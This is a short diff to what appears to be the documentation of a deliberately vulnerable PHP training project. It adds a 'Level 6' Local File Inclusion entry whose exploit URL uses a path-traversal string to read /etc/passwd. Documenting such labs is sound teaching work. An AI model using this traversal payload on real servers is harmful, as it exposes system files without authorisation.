@@ -40,3 +40,10 @@
 **Impact (with allow_url_include=On):** Execute arbitrary system commands on HTTP server. 
 
 
+## Level 6
+
+**Vulnerability:** Local File Inclusion
+
+**Exploit:** `/Vulnerable_code/PHP/LFI/level_6.php?file=./uploads_eede.php/../../../../../../../etc/passwd`
+
+**Impact:** Display the content of any PHP file on hard disk drive with the privileges of HTTP server. We can still change directories.
